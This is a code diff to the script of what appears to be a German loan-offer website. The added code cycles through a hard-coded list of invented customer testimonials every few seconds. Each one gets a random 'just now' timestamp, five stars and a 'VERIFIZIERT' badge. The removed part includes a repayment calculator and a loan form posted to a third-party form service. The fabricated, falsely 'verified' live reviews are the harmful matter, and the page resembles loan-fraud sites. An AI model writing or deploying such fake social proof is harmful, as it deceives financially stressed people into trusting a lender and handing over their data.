+        { n: "Angelika W.", l: "Wiesbaden", t: "Schnelle Zusage erhalten, bin begeistert." },
+        { n: "Uwe Z.", l: "Gelsenkirchen", t: "Endlich mal ein Partner, der wirklich zuhört." },
+        { n: "Gisela P.", l: "Mönchengladbach", t: "Seriöses Institut mit jahrelanger Erfahrung." },
+        { n: "Torsten F.", l: "Braunschweig", t: "Reibungslose Abwicklung über das Portal." },
+        { n: "Ingrid Q.", l: "Chemnitz", t: "Kompetente Beratung bei allen Fragen." },
+        { n: "Bernd U.", l: "Kiel", t: "Geld war pünktlich zur Hausrenovierung da." },
+        { n: "Helga D.", l: "Aachen", t: "Einfach den Antrag ausgefüllt und am nächsten Tag Bescheid." },
+        { n: "Dirk S.", l: "Halle", t: "Fair, schnell und absolut transparent." },
+        { n: "Marion G.", l: "Magdeburg", t: "Hat mir sehr geholfen in einer finanziellen Notlage." },
+        { n: "Ralf T.", l: "Freiburg", t: "Bestes Angebot nach langem Suchen gefunden." },
+        { n: "Erika K.", l: "Krefeld", t: "Sehr höfliches Personal am Telefon und im Chat." },
+        { n: "Dieter B.", l: "Lübeck", t: "Alles super gelaufen, danke an das Team!" },
+        { n: "Gudrun M.", l: "Oberhausen", t: "Die Sicherheit hat mich überzeugt. Alles verschlüsselt." },
+        { n: "Günter H.", l: "Erfurt", t: "Klare Empfehlung für jeden, der schnell Geld braucht." },
+        { n: "Christa L.", l: "Mainz", t: "Einfach nur Top-Service!" }
     ];
 
-    function getGermanTime() {
-        const times = ["2 Min.", "5 Min.", "12 Min.", "28 Min.", "45 Min.", "1 Std.", "3 Std."];
-        return times[Math.floor(Math.random() * times.length)];
+    const reviewContainer = document.getElementById('reviews-container');
+
+    function dropReview() {
+        const r = allReviews[Math.floor(Math.random() * allReviews.length)];
+        const seconds = Math.floor(Math.random() * 50) + 1;
+        
+        const html = `
+            <div class="review-card">
+                <div style="display:flex; justify-content:space-between; font-size:0.7rem; color:#999; margin-bottom:8px;">
+                    <span><i class="fas fa-clock"></i> Gerade eben (vor ${seconds}s)</span>
+                    <span style="color:var(--success); font-weight:800;"><i class="fas fa-check-circle"></i> VERIFIZIERT</span>
+                </div>
+                <div style="color:var(--bright-gold); margin-bottom:10px; font-size:0.8rem;">
+                    <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                </div>
+                <p style="font-style:italic; font-size:0.9rem; color:#333; line-height:1.4;">"${r.t}"</p>
+                <div style="margin-top:10px; font-weight:700; color:var(--navy); font-size:0.85rem;">
+                    ${r.n} <span style="font-weight:400; color:#666;">aus ${r.l}</span>
+                </div>
+            </div>
+        `;
+        
+        reviewContainer.insertAdjacentHTML('afterbegin', html);
+        
+        if(reviewContainer.children.length > 5) {
+            reviewContainer.removeChild(reviewContainer.lastElementChild);
+        }
     }
 
-    function renderReviews() {
-        const container = document.getElementById('reviews-container');
-        container.innerHTML = ""; 
-        const shuffled = [...internationalReviews].sort(() => 0.5 - Math.random());
-        shuffled.forEach(r => {
-            container.innerHTML += `
-                <div class="review-card">
-                    <span class="review-date"><i class="fas fa-clock" style="animation: blink-dot 1.5s infinite;"></i> Vor ${getGermanTime()}</span>
-                    <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                    <p class="review-text">"${r.t}"</p>
-                    <div class="review-author">
-                        <div>${r.n} (${r.p})</div>
-                        <span class="verified"><i class="fas fa-check-circle"></i> VERIFIZIERT</span>
-                    </div>
-                </div>`;
-        });
-    }
-    renderReviews();
-
-    const amtR = document.getElementById('amtRange');
-    const amtN = document.getElementById('amtNum');
-    const durR = document.getElementById('durRange');
-    const durT = document.getElementById('durText');
-    const resM = document.getElementById('monthlyRes');
-
-    function calc() {
-        let p = parseFloat(amtR.value); let n = parseInt(durR.value); let r = 0.035 / 12;
-        amtN.value = p; durT.innerText = n + " Monate";
-        let m = (p * r) / (1 - Math.pow(1 + r, -n));
-        resM.innerText = m.toFixed(2);
-        document.getElementById('hiddenAmt').value = p + " €";
-        document.getElementById('hiddenDur').value = n + " Monate";
-        document.getElementById('hiddenMens').value = m.toFixed(2) + " €";
-        let valA = (amtR.value - amtR.min) / (amtR.max - amtR.min) * 100;
-        amtR.style.backgroundSize = valA + '% 100%';
-        let valD = (durR.value - durR.min) / (durR.max - durR.min) * 100;
-        durR.style.backgroundSize = valD + '% 100%';
-    }
-
-    function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
-    function goToStep1() { document.getElementById('step2').style.display = 'none'; document.getElementById('step1').style.display = 'block'; }
-    function resetAll() { location.reload(); }
-
-    amtR.oninput = calc; durR.oninput = calc;
-    window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
-    calc();
-
-    const form = document.getElementById('loanForm');
-    form.onsubmit = async (e) => {
-        e.preventDefault();
-        const overlay = document.getElementById('loader-overlay');
-        overlay.style.display = 'flex';
-        const formData = new FormData(form);
-        try {
-            await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
-            setTimeout(() => {
-                document.getElementById('loading-content').style.display = 'none';
-                document.getElementById('success-message').style.display = 'block';
-            }, 3000);
-        } catch (error) { overlay.style.display = 'none'; alert("Error. Please try again."); }
-    };
+    // Faire tomber un avis toutes les 6 secondes
+    setInterval(dropReview, 6000);
+    // Initialiser les premiers avis
+    for(let i=0; i<3; i++) setTimeout(dropReview, i * 1500);
 </script>
 
 </body>
